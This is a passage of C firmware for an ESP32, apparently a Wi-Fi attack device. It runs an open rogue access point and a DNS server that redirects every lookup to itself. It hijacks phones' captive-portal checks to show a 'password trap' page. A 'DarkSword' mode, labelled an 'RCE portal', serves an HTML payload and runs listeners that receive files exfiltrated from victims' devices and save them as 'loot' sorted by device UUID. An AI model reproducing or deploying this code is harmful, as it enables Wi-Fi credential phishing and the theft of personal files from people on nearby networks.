static esp_err_t portal_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// URI handler for captive portal redirection
static esp_err_t captive_portal_handler(httpd_req_t *req) {
    // Redirect all requests to our portal page
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/portal");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

// Handler for root path - most devices try to access this first
static esp_err_t root_handler(httpd_req_t *req) {
    // Add captive portal headers for Android/Samsung detection
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_set_hdr(req, "Content-Type", "text/html; charset=utf-8");
    
    // Always return the portal HTML with password form
    httpd_resp_set_type(req, "text/html");
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Handler for Android captive portal detection (generate_204)
static esp_err_t android_captive_handler(httpd_req_t *req) {
    // Android expects a 204 No Content response for captive portal detection
    // If we return 204, Android thinks internet works
    // If we return 200 with HTML, Android thinks it's a captive portal
    // So we return 200 with our portal HTML to trigger captive portal
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Content-Type", "text/html");
    
    // Send our portal HTML to trigger captive portal
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Handler for iOS captive portal detection (hotspot-detect.html)
static esp_err_t ios_captive_handler(httpd_req_t *req) {
    // iOS detects captive portal when this endpoint returns something other than "Success"
    // So we return our portal HTML with password form to trigger captive portal popup
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Content-Type", "text/html");
    
    // Send our portal HTML to show password form
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Handler for common captive portal detection endpoints
static esp_err_t captive_detection_handler(httpd_req_t *req) {
    // Add captive portal headers
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Connection", "close");
    
    // Always return the portal HTML with password form
    httpd_resp_set_type(req, "text/html");
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// RFC 8908 Captive Portal API endpoint
static esp_err_t captive_api_handler(httpd_req_t *req) {
    // Set CORS headers
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
    
    // Handle preflight OPTIONS request
    if (req->method == HTTP_OPTIONS) {
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }
    
    // RFC 8908 compliant JSON response
    const char* json_response = 
        "{"
        "\"captive\": true,"
        "\"user-portal-url\": \"http://172.0.0.1/portal\","
        "\"venue-info-url\": \"http://172.0.0.1/portal\","
        "\"is-portal\": true,"
        "\"can-extend-session\": false,"
        "\"seconds-remaining\": 0,"
        "\"bytes-remaining\": 0"
        "}";
    
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json_response, strlen(json_response));
    
    return ESP_OK;
}

// DNS server task for captive portal
static void dns_server_task(void *pvParameters) {
    (void)pvParameters;
    
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    char rx_buffer[DNS_MAX_PACKET_SIZE];
    char tx_buffer[DNS_MAX_PACKET_SIZE];
    
    // Create UDP socket
    dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (dns_server_socket < 0) {
        dns_server_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Bind to DNS port 53
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(DNS_PORT);
    
    int err = bind(dns_server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (err < 0) {
        close(dns_server_socket);
        dns_server_socket = -1;
        dns_server_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Set socket timeout so we can check portal_active flag periodically
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(dns_server_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    // Main DNS server loop
    while (portal_active) {
        int len = recvfrom(dns_server_socket, rx_buffer, sizeof(rx_buffer), 0,
                          (struct sockaddr *)&client_addr, &client_addr_len);
        
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Timeout, check portal_active flag and continue
                continue;
            }
            break;
        }
        
        if (len < 12) {
            // DNS header is at least 12 bytes
            continue;
        }
        
        // Build DNS response
        // Copy transaction ID and flags from request
        memcpy(tx_buffer, rx_buffer, 2); // Transaction ID
        
        // Set flags: Response, Authoritative, No Error
        tx_buffer[2] = 0x81; // QR=1 (response), Opcode=0, AA=0, TC=0, RD=0
        tx_buffer[3] = 0x80; // RA=1, Z=0, RCODE=0 (no error)
        
        // Copy question count (should be 1)
        tx_buffer[4] = rx_buffer[4];
        tx_buffer[5] = rx_buffer[5];
        
        // Answer count = 1
        tx_buffer[6] = 0x00;
        tx_buffer[7] = 0x01;
        
        // Authority RRs = 0
        tx_buffer[8] = 0x00;
        tx_buffer[9] = 0x00;
        
        // Additional RRs = 0
        tx_buffer[10] = 0x00;
        tx_buffer[11] = 0x00;
        
        // Copy the question section from the request
        int question_len = 0;
        int pos = 12;
        while (pos < len && rx_buffer[pos] != 0) {
            pos += rx_buffer[pos] + 1;
        }
        pos++; // Skip final 0
        pos += 4; // Skip QTYPE and QCLASS
        question_len = pos - 12;
        
        if (question_len > 0 && question_len < (DNS_MAX_PACKET_SIZE - 12 - 16)) {
            memcpy(tx_buffer + 12, rx_buffer + 12, question_len);
            
            // Add answer section
            int answer_pos = 12 + question_len;
            
            // Name pointer to question (compression)
            tx_buffer[answer_pos++] = 0xC0;
            tx_buffer[answer_pos++] = 0x0C;
            
            // TYPE = A (0x0001)
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x01;
            
            // CLASS = IN (0x0001)
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x01;
            
            // TTL = 60 seconds
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x3C;
            
            // Data length = 4 bytes
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x04;
            
            // IP address: 172.0.0.1
            tx_buffer[answer_pos++] = 172;
            tx_buffer[answer_pos++] = 0;
            tx_buffer[answer_pos++] = 0;
            tx_buffer[answer_pos++] = 1;
            
            // Send response
            sendto(dns_server_socket, tx_buffer, answer_pos, 0,
                  (struct sockaddr *)&client_addr, client_addr_len);
        }
    }
    
    // Clean up
    close(dns_server_socket);
    dns_server_socket = -1;
    dns_server_task_handle = NULL;
    vTaskDelete(NULL);
}

// ─── DarkSword helpers ───────────────────────────────────────────────

// Load darksword.html from SD card into PSRAM
static bool load_darksword_html(void) {
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "DS: SD card init failed: %s", esp_err_to_name(ret));
        return false;
    }

    // Try gzipped version first — much smaller, faster to serve
    const char *gz_path = "/sdcard/lab/htmls/darksword.html.gz";
    const char *raw_path = "/sdcard/lab/htmls/darksword.html";
    bool is_gz = false;

    FILE *f = fopen(gz_path, "rb");
    if (f) {
        is_gz = true;
        MY_LOG_INFO(TAG, "DS: Found gzipped file %s", gz_path);
    } else {
        f = fopen(raw_path, "r");
        if (!f) {
            MY_LOG_INFO(TAG, "DS: Cannot open %s or %s", gz_path, raw_path);
            return false;
        }
    }

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fsize <= 0 || fsize > 4 * 1024 * 1024) {
        MY_LOG_INFO(TAG, "DS: File size invalid: %ld", fsize);
        fclose(f);
        return false;
    }

    if (darksword_html) {
        heap_caps_free(darksword_html);
        darksword_html = NULL;
    }

    darksword_html = (char *)heap_caps_malloc((size_t)fsize + 1, MALLOC_CAP_SPIRAM);
    if (!darksword_html) {
        MY_LOG_INFO(TAG, "DS: PSRAM alloc failed (%ld bytes)", fsize);
        fclose(f);
        return false;
    }

    size_t rd = fread(darksword_html, 1, (size_t)fsize, f);
    darksword_html[rd] = '\0';
    darksword_html_len = rd;
    darksword_html_gzipped = is_gz;
    fclose(f);
    MY_LOG_INFO(TAG, "DS: Loaded %s (%u bytes, gzip=%d)",
                is_gz ? gz_path : raw_path, (unsigned)rd, is_gz);
    return true;
}

// HTTP handler: serve darksword HTML with chunked transfer (2+ MB)
static esp_err_t darksword_page_handler(httpd_req_t *req) {
    if (!darksword_html || darksword_html_len == 0) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "HTML not loaded");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
    if (darksword_html_gzipped) {
        httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
    }

    // With gzip (~50-150 KB) the transfer is much faster and more reliable
    const size_t chunk = 4096;
    size_t sent = 0;
    while (sent < darksword_html_len) {
        size_t remaining = darksword_html_len - sent;
        size_t to_send = remaining < chunk ? remaining : chunk;
        esp_err_t err = httpd_resp_send_chunk(req, darksword_html + sent, to_send);
        if (err != ESP_OK) {
            MY_LOG_INFO(TAG, "DS: chunk send error at offset %u", (unsigned)sent);
            httpd_resp_send_chunk(req, NULL, 0);
            return ESP_FAIL;
        }
        sent += to_send;
    }
    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}

// Save one exfiltrated file to /sdcard/loot/portal/<category>/<filename>
static void darksword_save_loot(const char *json_body, size_t json_len) {
    cJSON *root = cJSON_ParseWithLength(json_body, json_len);
    if (!root) {
        MY_LOG_INFO(TAG, "DS loot: JSON parse failed");
        return;
    }

    const cJSON *j_path = cJSON_GetObjectItem(root, "path");
    const cJSON *j_cat  = cJSON_GetObjectItem(root, "category");
    const cJSON *j_data = cJSON_GetObjectItem(root, "data");
    const cJSON *j_uuid = cJSON_GetObjectItem(root, "deviceUUID");

    if (!cJSON_IsString(j_path) || !cJSON_IsString(j_data)) {
        MY_LOG_INFO(TAG, "DS loot: missing path/data");
        cJSON_Delete(root);
        return;
    }

    const char *category = (cJSON_IsString(j_cat) && j_cat->valuestring[0])
                            ? j_cat->valuestring : "misc";
    const char *uuid_str = (cJSON_IsString(j_uuid) && j_uuid->valuestring[0])
                            ? j_uuid->valuestring : "unknown";

    // Build directory: /sdcard/loot/portal/<uuid>/<category>/
    char dir[256];
    snprintf(dir, sizeof(dir), "/sdcard/loot/portal/%s/%s", uuid_str, category);

    // Recursive mkdir (up to 4 levels)
    {
        char tmp[256];
        snprintf(tmp, sizeof(tmp), "%s", dir);
        for (char *p = tmp + 1; *p; p++) {
            if (*p == '/') {
                *p = '\0';
                mkdir(tmp, 0755);
                *p = '/';
            }
        }
        mkdir(tmp, 0755);
    }

    // Derive filename from path (last component)
    const char *fname = strrchr(j_path->valuestring, '/');
    fname = fname ? fname + 1 : j_path->valuestring;
    if (!fname[0]) fname = "data.bin";

    char filepath[320];
    snprintf(filepath, sizeof(filepath), "%s/%s", dir, fname);

    // Base64-decode data
    const char *b64 = j_data->valuestring;
    size_t b64_len = strlen(b64);
    size_t decoded_len = 0;

    // First pass: get decoded length
    if (mbedtls_base64_decode(NULL, 0, &decoded_len, (const unsigned char *)b64, b64_len) != MBEDTLS_ERR_BASE64_BUFFER_TOO_SMALL && decoded_len == 0) {
        MY_LOG_INFO(TAG, "DS loot: base64 length check failed");
        cJSON_Delete(root);
        return;
    }

    uint8_t *decoded = (uint8_t *)heap_caps_malloc(decoded_len, MALLOC_CAP_SPIRAM);
    if (!decoded) {
        decoded = (uint8_t *)malloc(decoded_len);
    }
    if (!decoded) {
        MY_LOG_INFO(TAG, "DS loot: alloc %u failed", (unsigned)decoded_len);
        cJSON_Delete(root);
        return;
    }

    size_t olen = 0;
    int rc = mbedtls_base64_decode(decoded, decoded_len, &olen,
                                    (const unsigned char *)b64, b64_len);
    if (rc != 0) {
        MY_LOG_INFO(TAG, "DS loot: base64 decode error %d", rc);
        free(decoded);
        cJSON_Delete(root);
        return;
    }

    FILE *f = fopen(filepath, "wb");
    if (!f) {
        MY_LOG_INFO(TAG, "DS loot: cannot write %s", filepath);
        free(decoded);
        cJSON_Delete(root);
        return;
    }
    fwrite(decoded, 1, olen, f);
    fflush(f);
    fclose(f);
    sd_sync();

    MY_LOG_INFO(TAG, "DS loot: saved %s (%u bytes) [%s]", filepath, (unsigned)olen, category);
    free(decoded);
    cJSON_Delete(root);
}

// HTTP POST /stats handler — exfil data arriving on port 80
static esp_err_t darksword_stats_handler(httpd_req_t *req) {
    // Allow CORS preflight
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "POST, OPTIONS");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");

    if (req->method == HTTP_OPTIONS) {
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }

    int total = req->content_len;
    if (total <= 0 || total > 2 * 1024 * 1024) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad length");
        return ESP_FAIL;
    }

    char *body = (char *)heap_caps_malloc(total + 1, MALLOC_CAP_SPIRAM);
    if (!body) body = (char *)malloc(total + 1);
    if (!body) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
        return ESP_FAIL;
    }

    int received = 0;
    while (received < total) {
        int r = httpd_req_recv(req, body + received, total - received);
        if (r <= 0) {
            free(body);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Recv error");
            return ESP_FAIL;
        }
        received += r;
    }
    body[received] = '\0';

    darksword_save_loot(body, (size_t)received);
    free(body);

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, "{\"status\":\"ok\"}", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Raw TCP exfiltration listener on port 8080
// Accepts connections, reads HTTP-like POST /stats, extracts JSON body
static void darksword_exfil_task(void *pvParameters) {
    (void)pvParameters;

    int listen_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_fd < 0) {
        MY_LOG_INFO(TAG, "DS exfil: socket() failed");
        darksword_exfil_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    darksword_exfil_socket = listen_fd;

    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(8080),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        MY_LOG_INFO(TAG, "DS exfil: bind() failed");
        close(listen_fd);
        darksword_exfil_socket = -1;
        darksword_exfil_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    if (listen(listen_fd, 2) < 0) {
        MY_LOG_INFO(TAG, "DS exfil: listen() failed");
        close(listen_fd);
        darksword_exfil_socket = -1;
        darksword_exfil_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    MY_LOG_INFO(TAG, "DS exfil: listening on port 8080");

    while (darksword_active) {
        struct sockaddr_in cli;
        socklen_t cli_len = sizeof(cli);
        int client_fd = accept(listen_fd, (struct sockaddr *)&cli, &cli_len);
        if (client_fd < 0) {
            if (!darksword_active) break;
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        // Set receive timeout
        struct timeval tv = { .tv_sec = 10, .tv_usec = 0 };
        setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        // Read up to 2 MB
        size_t buf_sz = 2 * 1024 * 1024;
        char *buf = (char *)heap_caps_malloc(buf_sz, MALLOC_CAP_SPIRAM);
        if (!buf) {
            close(client_fd);
            continue;
        }

        size_t total_read = 0;
        while (total_read < buf_sz) {
            int r = recv(client_fd, buf + total_read, buf_sz - total_read, 0);
            if (r <= 0) break;
            total_read += (size_t)r;
            // Check if we got the full HTTP request (double CRLF + content-length worth of body)
            if (total_read > 4) {
                char *body_start = strstr(buf, "\r\n\r\n");
                if (body_start) {
                    body_start += 4;
                    // Try to find Content-Length
                    char *cl_hdr = strcasestr(buf, "Content-Length:");
                    if (cl_hdr) {
                        int cl = atoi(cl_hdr + 15);
                        size_t hdr_len = (size_t)(body_start - buf);
                        if (cl > 0 && total_read >= hdr_len + (size_t)cl) break;
                    }
                }
            }
        }
        buf[total_read < buf_sz ? total_read : buf_sz - 1] = '\0';

        // Send HTTP 200 response
        const char *resp = "HTTP/1.1 200 OK\r\n"
                           "Content-Type: application/json\r\n"
                           "Access-Control-Allow-Origin: *\r\n"
                           "Connection: close\r\n"
                           "Content-Length: 15\r\n\r\n"
                           "{\"status\":\"ok\"}";
        send(client_fd, resp, strlen(resp), 0);
        close(client_fd);

        // Extract JSON body
        char *body = strstr(buf, "\r\n\r\n");
        if (body) {
            body += 4;
            size_t body_len = total_read - (size_t)(body - buf);
            if (body_len > 0) {
                darksword_save_loot(body, body_len);
            }
        }
        heap_caps_free(buf);
    }

    if (darksword_exfil_socket >= 0) {
        close(darksword_exfil_socket);
        darksword_exfil_socket = -1;
    }
    MY_LOG_INFO(TAG, "DS exfil: task exiting");
    darksword_exfil_task_handle = NULL;
    vTaskDelete(NULL);
}

// ─── cmd_start_darksword ─────────────────────────────────────────────
static int cmd_start_darksword(int argc, char **argv) {
    oled_display_update_full("> DarkSword",
        argc >= 2 ? argv[1] : "  No SSID",
        "  RCE portal", "  Waiting...");
    log_memory_info("start_darksword");

    if (!ensure_wifi_mode()) return 1;

    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: start_darksword <SSID>");
        return 1;
    }

    if (portal_active || darksword_active) {
        MY_LOG_INFO(TAG, "A portal is already running. Use 'stop' first.");
        return 0;
    }

    const char *ssid = argv[1];
    size_t ssid_len = strlen(ssid);
    if (ssid_len == 0 || ssid_len > 32) {
        MY_LOG_INFO(TAG, "SSID length must be 1-32");
        return 1;
    }

    // Load HTML from SD
    if (!load_darksword_html()) return 1;

    // Store portal SSID
    if (portalSSID) { free(portalSSID); portalSSID = NULL; }
    portalSSID = strdup(ssid);

    MY_LOG_INFO(TAG, "Starting DarkSword portal with SSID: %s", ssid);

    // Enable AP
    esp_netif_t *ap_netif = ensure_ap_mode();
    if (!ap_netif) { MY_LOG_INFO(TAG, "DS: AP mode failed"); return 1; }

    esp_netif_dhcps_stop(ap_netif);

    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr      = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr      = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    esp_netif_set_ip_info(ap_netif, &ip_info);

    wifi_config_t ap_cfg = {0};
    memcpy(ap_cfg.ap.ssid, ssid, ssid_len);
    ap_cfg.ap.ssid_len = ssid_len;
    ap_cfg.ap.channel = 1;
    ap_cfg.ap.max_connection = 4;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);

    esp_netif_dhcps_start(ap_netif);
    vTaskDelay(pdMS_TO_TICKS(1000));

    // HTTP server config — increase max_uri_handlers and recv buffer for large POST
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_open_sockets = 4;
    config.max_uri_handlers = 16;
    config.recv_wait_timeout = 30;
    config.send_wait_timeout = 30;
    config.stack_size = 8192;

    esp_err_t http_ret = httpd_start(&portal_server, &config);
    if (http_ret != ESP_OK) {
        MY_LOG_INFO(TAG, "DS: HTTP server failed: %s", esp_err_to_name(http_ret));
        return 1;
    }

    // Register darksword page on all captive-portal paths
    const httpd_uri_t page_uris[] = {
        { .uri = "/",                   .method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/portal",             .method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/hotspot-detect.html",.method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/generate_204",       .method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/ncsi.txt",           .method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/*",                  .method = HTTP_GET, .handler = darksword_page_handler },
    };
    for (int i = 0; i < sizeof(page_uris)/sizeof(page_uris[0]); i++) {
        httpd_register_uri_handler(portal_server, &page_uris[i]);
    }

    // POST /stats on port 80 (backup path)
    const httpd_uri_t stats_post = {
        .uri = "/stats", .method = HTTP_POST, .handler = darksword_stats_handler
    };
    httpd_register_uri_handler(portal_server, &stats_post);

    // OPTIONS /stats for CORS preflight
    const httpd_uri_t stats_options = {
        .uri = "/stats", .method = HTTP_OPTIONS, .handler = darksword_stats_handler
    };
    httpd_register_uri_handler(portal_server, &stats_options);

    // RFC 8908 captive portal API
    const httpd_uri_t api_uri = {
        .uri = "/captive-portal/api", .method = HTTP_GET, .handler = captive_api_handler
    };
    httpd_register_uri_handler(portal_server, &api_uri);

    darksword_active = true;
    portal_active = true;

    // DNS server
    BaseType_t dns_ret = xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5,
                                     &dns_server_task_handle);
    if (dns_ret != pdPASS) {
        darksword_active = false;
        portal_active = false;
        httpd_stop(portal_server);
        portal_server = NULL;
        return 1;
    }

    // Exfil listener on port 8080
    BaseType_t exfil_ret = xTaskCreate(darksword_exfil_task, "ds_exfil", 8192, NULL, 5,
                                       &darksword_exfil_task_handle);
    if (exfil_ret != pdPASS) {
        MY_LOG_INFO(TAG, "DS: exfil task creation failed — port 80 /stats still available");
    }

    led_set_color(255, 0, 0); // Red for DarkSword

    MY_LOG_INFO(TAG, "DarkSword portal active!");
    MY_LOG_INFO(TAG, "  AP: %s  IP: 172.0.0.1", ssid);
    MY_LOG_INFO(TAG, "  HTTP :80   Exfil :8080");
    MY_LOG_INFO(TAG, "  Loot: /sdcard/loot/portal/");
    return 0;
}

// Start portal command
static int cmd_start_portal(int argc, char **argv) {
    oled_display_update_full("> Captive Portal",
        argc >= 2 ? argv[1] : "  No SSID",
        "  Password trap", "  Waiting...");
    log_memory_info("start_portal");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check for SSID argument
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: start_portal <SSID>");
        MY_LOG_INFO(TAG, "Example: start_portal MyWiFi");
        return 1;
    }
    
    // Check if portal is already running
    if (portal_active) {
        MY_LOG_INFO(TAG, "Portal already running. Use 'stop' to stop it first.");
        return 0;
    }
    
    const char *ssid = argv[1];
    size_t ssid_len = strlen(ssid);
    
    // Validate SSID length (WiFi SSID max is 32 characters)
    if (ssid_len == 0 || ssid_len > 32) {
        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
        return 1;
    }
    
    // Store portal SSID for logging purposes
    if (portalSSID != NULL) {
        free(portalSSID);
    }
    portalSSID = malloc(ssid_len + 1);
    if (portalSSID != NULL) {
        strcpy(portalSSID, ssid);
    }
    
    MY_LOG_INFO(TAG, "Starting captive portal with SSID: %s", ssid);
    
    // Enable AP mode and get AP netif
    esp_netif_t *ap_netif = ensure_ap_mode();
    if (!ap_netif) {
        MY_LOG_INFO(TAG, "Failed to enable AP mode");
        return 1;
    }
    
    // Stop DHCP server to configure custom IP
    esp_netif_dhcps_stop(ap_netif);
    
    // Set static IP 172.0.0.1 for AP
    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    
    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
    if (ret != ESP_OK) {
        return 1;
    }
    
    MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
    
    // Configure AP with provided SSID
    wifi_config_t ap_config = {0};
    memcpy(ap_config.ap.ssid, ssid, ssid_len);
    ap_config.ap.ssid_len = ssid_len;
    ap_config.ap.channel = 1;
    ap_config.ap.password[0] = '\0';
    ap_config.ap.max_connection = 4;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    
    // AP mode already enabled by ensure_ap_mode(), just configure it
    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
        return 1;
    }
    
    // Start DHCP server
    ret = esp_netif_dhcps_start(ap_netif);
    if (ret != ESP_OK) {
        esp_wifi_stop();
        return 1;
    }
    
    // Wait a bit for AP to fully start
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    // Configure HTTP server
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_open_sockets = 7;
    
    // Start HTTP server
    esp_err_t http_ret = httpd_start(&portal_server, &config);
    if (http_ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
        esp_wifi_stop();
        return 1;
    }
    
    MY_LOG_INFO(TAG, "HTTP server started successfully on port 80");
    
    // Register URI handlers
    // Root path handler - most devices try this first
    httpd_uri_t root_uri = {
        .uri = "/",
        .method = HTTP_GET,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_uri);
    
    // Root path handler for POST requests
    httpd_uri_t root_post_uri = {
        .uri = "/",
        .method = HTTP_POST,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_post_uri);
    
    // Portal page handler
    httpd_uri_t portal_uri = {
        .uri = "/portal",
        .method = HTTP_GET,
        .handler = portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &portal_uri);
    
    // Login handler
    httpd_uri_t login_uri = {
        .uri = "/login",
        .method = HTTP_POST,
        .handler = login_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &login_uri);
    
    // GET handler
    httpd_uri_t get_uri = {
        .uri = "/get",
        .method = HTTP_GET,
        .handler = get_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &get_uri);
    
    // Save handler
    httpd_uri_t save_uri = {
        .uri = "/save",
        .method = HTTP_POST,
        .handler = save_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &save_uri);
    
    // Android captive portal detection
    httpd_uri_t android_captive_uri = {
        .uri = "/generate_204",
        .method = HTTP_GET,
        .handler = android_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &android_captive_uri);
    
    // iOS captive portal detection
    httpd_uri_t ios_captive_uri = {
        .uri = "/hotspot-detect.html",
        .method = HTTP_GET,
        .handler = ios_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &ios_captive_uri);
    
    // Samsung captive portal detection
    httpd_uri_t samsung_captive_uri = {
        .uri = "/ncsi.txt",
        .method = HTTP_GET,
        .handler = captive_detection_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &samsung_captive_uri);
    
    // Catch-all handler for other requests
    httpd_uri_t captive_uri = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = captive_portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_uri);
    
    // Register RFC 8908 Captive Portal API endpoint
    httpd_uri_t captive_api_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_GET,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_uri);
    
    // Register RFC 8908 Captive Portal API endpoint for POST/OPTIONS
    httpd_uri_t captive_api_post_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_POST,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_post_uri);
    
    // Register RFC 8908 Captive Portal API endpoint for OPTIONS
    httpd_uri_t captive_api_options_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_OPTIONS,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_options_uri);
    
